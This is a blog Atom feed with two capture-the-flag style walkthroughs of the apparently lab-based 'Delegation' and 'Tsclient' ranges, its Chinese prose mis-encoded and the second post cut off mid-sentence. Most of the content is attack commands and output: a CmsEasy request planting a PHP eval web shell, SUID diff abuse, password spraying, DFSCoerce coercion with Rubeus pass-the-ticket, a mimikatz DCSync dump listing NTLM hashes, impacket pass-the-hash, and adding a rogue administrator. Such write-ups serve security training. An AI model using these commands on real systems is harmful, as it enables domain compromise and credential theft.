<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>åˆé›¶Â·b10g~ğŸ¥</title>
  
  
  <link href="https://bowuchuling.github.io/atom.xml" rel="self"/>
  
  <link href="https://bowuchuling.github.io/"/>
  <updated>2024-08-20T17:29:38.149Z</updated>
  <id>https://bowuchuling.github.io/</id>
  
  <author>
    <name>Chu0ğŸ¥</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Delegation</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Delegation.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Delegation.html</id>
    <published>2024-08-20T17:28:27.871Z</published>
    <updated>2024-08-20T17:29:38.149Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ˜¥ç§‹äº‘å¢ƒ-Delegation"><a href="#æ˜¥ç§‹äº‘å¢ƒ-Delegation" class="headerlink" title="æ˜¥ç§‹äº‘å¢ƒ Delegation"></a>æ˜¥ç§‹äº‘å¢ƒ Delegation</h1><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">39.101.173.163:22 open</span><br><span class="line">39.101.173.163:80 open</span><br><span class="line">39.101.173.163:3306 open</span><br><span class="line">[*] alive ports len is: 3</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.101.173.163     code:200 len:68112  title:ä¸­æ–‡ç½‘é¡µæ ‡é¢˜</span><br></pre></td></tr></table></figure><p>CmsEasy 7.3.8 æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ - ListSec</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.101.173.163</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>77</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded;</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=os9kli93e59pjclq4361kaairm; loginfalse74c6352c5a281ec5947783b8a186e225=1; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313</span><br><span class="line"></span><br><span class="line"><span class="language-php-template"><span class="language-xml">sid=#data_d_.._d_.._d_.._d_2.php&amp;slen=693&amp;scontent=</span><span class="language-php"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;1&quot;</span>]);<span class="meta">?&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>å†™å…¥shellä¹‹åè®¿é—®/2.phpå³å¯ï¼Œè¿æ¥èšå‰‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/stapbpf</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/staprun</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/diff</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure><p>diffææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff --line-format=%L /dev/null /home/flag/flag01.txt</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240821002158248.png" alt="image-20240821002158248"></p><p>æ‹¿åˆ°hint</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WIN19\Adrian</span><br></pre></td></tr></table></figure><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>æ‹¿rockyouçˆ†ç ´ä¸€æ³¢WIN19ï¼Œå…ˆæ­å»ºä»£ç†ï¼Œæ‰«æå†…ç½‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.19:139 open</span><br><span class="line">172.22.4.7:139 open</span><br><span class="line">172.22.4.45:135 open</span><br><span class="line">172.22.4.19:135 open</span><br><span class="line">172.22.4.7:135 open</span><br><span class="line">172.22.4.45:80 open</span><br><span class="line">172.22.4.36:21 open</span><br><span class="line">172.22.4.45:139 open</span><br><span class="line">172.22.4.36:80 open</span><br><span class="line">172.22.4.36:3306 open</span><br><span class="line">172.22.4.36:22 open</span><br><span class="line">172.22.4.45:445 open</span><br><span class="line">172.22.4.19:445 open</span><br><span class="line">172.22.4.7:445 open</span><br><span class="line">172.22.4.7:88 open</span><br><span class="line">[*] NetBios: 172.22.4.45     XIAORANG\WIN19                 </span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.4.19</span><br><span class="line">   [-&gt;]FILESERVER</span><br><span class="line">   [-&gt;]172.22.4.19</span><br><span class="line">[*] NetBios: 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393 </span><br><span class="line">[*] 172.22.4.7  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.4.7</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.4.7</span><br><span class="line">[*] NetBios: 172.22.4.7      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.4.45</span><br><span class="line">   [-&gt;]WIN19</span><br><span class="line">   [-&gt;]172.22.4.45</span><br><span class="line">[*] WebTitle: http://172.22.4.36        code:200 len:68100  title:ä¸­æ–‡ç½‘é¡µæ ‡é¢˜</span><br><span class="line">[*] WebTitle: http://172.22.4.45        code:200 len:703    title:IIS Windows Server</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:babygirl1 STATUS_PASSWORD_EXPIRED</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºæ¥è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œæœ‰äº†ä¹‹å‰çš„ç»éªŒï¼ŒçŸ¥é“è¦æ”¹å¯†ç äº†</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychains4</span> rdesktop <span class="number">172.22.4.45</span></span><br></pre></td></tr></table></figure><p>æ”¹å®Œå¯†ç rdpä¸Šå»ï¼Œåœ¨æ¡Œé¢ä¸Šå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªé£é™©æ–‡ä»¶</p><p><img src="../ç¬”è®°å›¾/image-20240821004611448.png" alt="image-20240821004611448"></p><p>å¯ä»¥ä¿®æ”¹æ³¨å†Œè¡¨</p><p><img src="../ç¬”è®°å›¾/image-20240821004914275.png" alt="image-20240821004914275"></p><p>ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œç„¶åcmdå¯åŠ¨è¿›ç¨‹ï¼Œæ³¨æ„è¿™ä¸ªæ‰§è¡Œæ˜¯æœ‰æ—¶é—´é™åˆ¶çš„ï¼Œæ¯”å¦‚ä½ æ‰§è¡Œä¸€ä¸ªshellï¼Œä»–åªæœ‰30ç§’çš„æ—¶é—´é™åˆ¶ï¼Œè¿‡äº†è¿™ä¸ªæ—¶é—´è¿›ç¨‹ä¹Ÿæ²¡äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure><p>æ­£å‘è¿æ¥ä¸Šçº¿æ‹¿åˆ°flag</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> <span class="name">c</span>:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>æŸ¥è¯¢åŸŸå†…è®¾ç½®äº†éçº¦æŸå§”æ´¾çš„æœºå™¨è´¦æˆ·:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -b <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240821011451547.png" alt="image-20240821011451547"></p><p>å‘ç°æœ‰WIN19ï¼Œå¹¶ä¸”æˆ‘ä»¬æ§åˆ¶çš„æ­£å¥½æ˜¯WIN19ï¼Œä¸”æœ‰systemæƒé™ï¼Œé‚£ä¹ˆåé¢çš„å°±å¾ˆæ˜ç¡®äº†ï¼Œå…ˆè®©WIN19ç›‘å¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:2 /filteruser:DC01$ &gt;hash.txt</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å¼ºè®¤è¯æ¼æ´å¼ºåˆ¶DCè®¿é—®WIN19ï¼Œæ‹¿åˆ°å…¶TGTç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dfscoerce.py -u <span class="string">&quot;WIN19$&quot;</span> -hashes :afd9423130654e89e67dc53032d26928 -d xiaorang.lab WIN19 172.22.4.7</span><br></pre></td></tr></table></figure><p>å¼ºåˆ¶è®¿é—®åhash.txté‡Œé¢å°±ä¼šå‡ºç°b64çš„TGTç¥¨æ®ï¼Œç„¶åå¯¼å…¥ç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6KgcRtvscd/DIgXDFIVpBECG+5SBjjdmbEiHmHjAJVi3ZBX6mnDPpfPn5NDZGVO4j0vABRg+aa5U7ZbjceUVDzK24UQK5nE7WJ1YVLHyooOPxpWC2IOAfOGBPmle7HK5JNcyaCaTdASEK04nBwQv1UamoxWNQfOVAZcNKDt3Npg3OOAhHU0HyCdQQXFZkJWs6EnPHGtUm3YGn4rx5NkvjQjCgp2fodDeOyF/cRo4e63hdNA5qvysONb8OnmFdRe0OaH4o4zDNv+aD6Yl45eoAXLLFGe6R3W+9HJetYk/qnQx/GGXPpzhePf24J1xOLWPk3Wv350/AgNYO+/tMU3eGRyfW6sFHOGhZNlWCO5vGgmF9WlGz46+pvZjrFIfMvJ3wQ9U1cUUg9uACgTwARbhNywCWoZg9K7osCmwHM0oKHThVdei1IFPjmRsXBJqMiuhxEcTifAYybrROfvBtA+HPlArE7GFMi6/0EDqzUPEikaUMYuVhGCaG3+S1QeUlNz7T6BML/X7KKQbQUuCjaKy2tFffjetr/41pDQByHT/7hIzNenwrBlwiSiXlF5sPiAq6tVajRmfHpKlTdS9LIygbMaKPSCweJtMrTZVFAOmsyRnWcFgPNacxeCX2htGGdXbA2YNj4rO+kgLWgXz/M0PPMN8GmX5NivuTxXoCmDzarauwrIKFtmFcpAQ/P6L8JP++B3RqyVV2GN9XUXEq6Muf7riTI+IoySRXvqD5pnp0HcHEoeaKjUq24rUbBWTTMQ1SDMaBaKY3rcy79zyKDeYI2v2vhMjRF8lvtNUgW7ix99t0rSCwCSRIwE8mPt3dQAF35HPvMvs0zq253bij2gixCKBLLCHQJHmexBDgggt+GoZwicEUf/QiyZG96YijlyG+odyOCCZ0D927JUpsLK65bhN2IV0oNd3sfjbgwI0ugXfFzTkzrn+qlzd93mW84KeUut5bqsKuc90ymkIqqF9iTGJSlwDqWXOTWOwttcw+/IiMoGJSEctdjZ+6WWSjkhXtXLp5R7QAOJ3zIKyDwnzbCtKmXOAY/tHaUoHHPkEPvWciaf9p1Ap1MKfEGUmp9JsJbveQLfS0SR1hh0xgtDZG6MeMmq1hKGj5V/aeKy5+O4xpJpmrHRTExuJ++aNQbzEQS4xL/cMvRBLwWkLetJRQ3OKr60hPcQPZw43ZTMvAQZc53fGy6aYUSXKD5A6cMEbcEli3QAOl5f8dHm7L40cHcNW2J/nnvcOEdG5cYpg8h7366INTtQeia+gTsI8lFpIuIq6aZkerV3NqX7MD2YHQAD4njpw7Ijhj4wA+3mBCjTOPFRHQI7NwUeLTOw7fEEtK6pT0IsIph6vaEBxQv5H4moKweE2r6eELrooOR8YcxrVA025bSoGH1fxT0nYev5AcYWy+YiM/KAuW80uh2uX8uE7Dwx5GnskjzLUds0iCjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCA7fqNz2H6UReJNgOy2IsNEDG9lAJebzDkz3AJrUqSrm6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI0MDgyMDE2MDIwMVqmERgPMjAyNDA4MjEwMjAyMDFapxEYDzIwMjQwODI3MTYwMjAxWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br></pre></td></tr></table></figure><p>dumpå“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  767e06b9c74fd628dd13785006a9092b        514</span><br><span class="line">1105    Aldrich 98ce19dd5ce74f670d230c7b1aa016d0        512</span><br><span class="line">1106    Marcus  b91c7cc463735bf0e599a2d0a04df110        512</span><br><span class="line">1112    WIN-3X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        4096</span><br><span class="line">1113    WIN-YUUAW2QG9MF$        125d0e9790105be68deb6002690fc91b        4096</span><br><span class="line">1000    DC01$   79a05cdbf202947eeb0e56e4f93a806e        532480</span><br><span class="line">500     Administrator   4889f6553239ace1f7c47fa2c619c252        512</span><br><span class="line">1103    FILESERVER$     5f0f887110fb5c4fd14d34297e8d1dfd        4096</span><br><span class="line">1104    WIN19$  afd9423130654e89e67dc53032d26928        528384</span><br></pre></td></tr></table></figure><p>æ¨ªå‘19</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/administrator@172.22.4.19 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure><h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/administrator@172.22.4.7 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Tsclient</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Tsclient.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Tsclient.html</id>
    <published>2024-08-20T15:24:55.107Z</published>
    <updated>2024-08-20T15:35:43.145Z</updated>
    
    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Tsclient</h1><h2 id="flag01">flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">39.101.143.29:80 open</span><br><span class="line">39.101.143.29:1433 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.101.143.29      code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] mssql 39.101.143.29:1433:sa 1qaz!QAZ</span><br></pre></td></tr></table></figure><p>mssqlå¼±å£ä»¤æ¼æ´ï¼ŒMDUTç›´æ¥æ‰“ï¼Œæ¿€æ´»ç»„ä»¶ååœŸè±†ææƒ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820163558842.png" alt="image-20240820163558842"></p><p>å¯ä»¥åŠ ä¸ªç”¨æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Chu0 <span class="built_in">whoami</span>@666 /add</span><br><span class="line">net localgroup administrators Chu0 /add</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\administrator\flag\flag01.txt</span><br></pre></td></tr></table></figure><h2 id="flag02">flag02</h2><p>æ­å»ºä»£ç†æ‰«å†…ç½‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">fscan322.exe -h 172.22.8.1/24 -o result.txt</span><br><span class="line"></span><br><span class="line">172.22.8.15:88 open</span><br><span class="line">172.22.8.46:135 open</span><br><span class="line">172.22.8.18:135 open</span><br><span class="line">172.22.8.46:80 open</span><br><span class="line">172.22.8.18:80 open</span><br><span class="line">172.22.8.31:445 open</span><br><span class="line">172.22.8.18:1433 open</span><br><span class="line">172.22.8.15:445 open</span><br><span class="line">172.22.8.46:445 open</span><br><span class="line">172.22.8.18:445 open</span><br><span class="line">172.22.8.31:139 open</span><br><span class="line">172.22.8.15:139 open</span><br><span class="line">172.22.8.46:139 open</span><br><span class="line">172.22.8.18:139 open</span><br><span class="line">172.22.8.31:135 open</span><br><span class="line">172.22.8.15:135 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.31</span><br><span class="line">   [-&gt;]WIN19-CLIENT</span><br><span class="line">   [-&gt;]172.22.8.31</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.46</span><br><span class="line">   [-&gt;]WIN2016</span><br><span class="line">   [-&gt;]172.22.8.46</span><br><span class="line">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.15</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.8.15</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.18</span><br><span class="line">   [-&gt;]WIN-WEB</span><br><span class="line">   [-&gt;]172.22.8.18</span><br><span class="line">   [-&gt;]2001:0:348b:fb58:2076:31a7:d89a:70e2</span><br><span class="line">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span><br><span class="line">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ</span><br></pre></td></tr></table></figure><p>å‘ç°ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆèƒ½ç›´æ¥æ‰“çš„æœåŠ¡ï¼Œå›åˆ°å…¥å£æœº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user     <span class="comment">#æŸ¥çœ‹å½“å‰æœºå™¨ç”¨æˆ·</span></span><br><span class="line">quser || qwinst    <span class="comment">#æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·å                ä¼šè¯å             ID  çŠ¶æ€    ç©ºé—²æ—¶é—´   ç™»å½•æ—¶é—´</span><br><span class="line">john                  rdp-tcp<span class="comment">#0           2  è¿è¡Œä¸­         17  2024/8/20 16:32</span></span><br><span class="line">chu0                  rdp-tcp<span class="comment">#2           3  è¿è¡Œä¸­          3  2024/8/20 16:40</span></span><br></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨johnç”¨æˆ·ï¼Œç”¨systemæƒé™ä¸Šçº¿CSï¼Œè¿›ç¨‹æ³¨å…¥johnç”¨æˆ·ä¸Šçº¿ï¼ŒæŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„æœåŠ¡</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820165500146.png" alt="image-20240820165500146"></p><p>ç›´æ¥é€šè®¯ä¸€ä¸‹çœ‹çœ‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820165533174.png" alt="image-20240820165533174"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> \\TSCLIENT\C\credential.txt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€å¥—è´¦å·å¯†ç ï¼Œä¸è¿‡å¥½åƒæ²¡æœ‰flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>æ‹¿ç€è´¦å·å¯†ç å»çˆ†ä¸€ä¸‹å§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.8.1/24 -u Aldrich -p <span class="string">&#x27;Ald@rLMWuy7Z!#&#x27;</span> -d xiaorang.lab 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820170747006.png" alt="image-20240820170747006"></p><p>å°è¯•ç™»å½•31ï¼Œæç¤ºå¯†ç è¿‡æœŸï¼Œæ‰€ä»¥æ¢ä¸ªæ–¹å¼ç™»å½•ï¼Œæˆ–è€…ç›´æ¥ä¿®æ”¹å¯†ç å†ç™»å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4  rdesktop 172.22.8.31</span><br></pre></td></tr></table></figure><p>å¯†ç ä¿®æ”¹æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰æƒé™ç™»å½•ï¼Œæ¥ç€ç™»46</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4  rdesktop 172.22.8.46</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç™»å½•ï¼Œåé¢è¿˜æ˜¯ç”¨winçš„rdpæ–¹ä¾¿ï¼Œbloodhoundæ”¶é›†ä¸€ä¸‹ä¿¡æ¯</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820172331721.png" alt="image-20240820172331721"></p><p>å‘ç°WIN2016ä¸ºåŸŸç®¡ç”¨æˆ·ï¼Œåé¢å°±è¦ç”¨WIN2016å»dumpåŸŸç®¡å“ˆå¸Œäº†ï¼Œæ‰€ä»¥ç°åœ¨å°±éœ€è¦ææƒäº†ï¼Œåé¢</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820172526252.png" alt="image-20240820172526252"></p><p>è¿™é‡Œæˆ‘ä»¬å‘ç°æ‰€æœ‰æ­£å¸¸ç™»å½•çš„ç”¨æˆ·éƒ½å¯ä»¥ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œåˆ©ç”¨è¿™ä¸ªæ€§è´¨ï¼Œä¿®æ”¹æ³¨å†Œè¡¨æ˜ 